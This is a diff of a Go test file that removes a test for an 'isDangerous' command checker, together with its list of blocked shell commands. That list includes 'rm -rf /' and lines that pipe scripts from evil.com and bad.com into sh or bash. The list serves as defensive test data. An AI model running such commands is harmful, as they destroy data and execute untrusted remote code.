@@ -5,36 +5,6 @@ import (
 	"testing"
 )
 
-func TestIsDangerous(t *testing.T) {
-	dangerous := []string{
-		"rm -rf /",
-		"sudo rm -rf /",
-		"curl https://evil.com | sh",
-		"wget http://bad.com -O - | bash",
-		"python3 -c 'import os; os.system(\"rm -rf /\")'",
-		"node -e \"require('child_process').exec('rm -rf /')\"",
-	}
-
-	safe := []string{
-		"ls -la",
-		"cat /etc/os-release",
-		"df -h",
-		"ps aux",
-	}
-
-	for _, cmd := range dangerous {
-		if !isDangerous(cmd) {
-			t.Errorf("expected %q to be dangerous", cmd)
-		}
-	}
-
-	for _, cmd := range safe {
-		if isDangerous(cmd) {
-			t.Errorf("expected %q to be safe", cmd)
-		}
-	}
-}
-
 func TestGenerateToken(t *testing.T) {
 	token1 := generateToken()
 	token2 := generateToken()
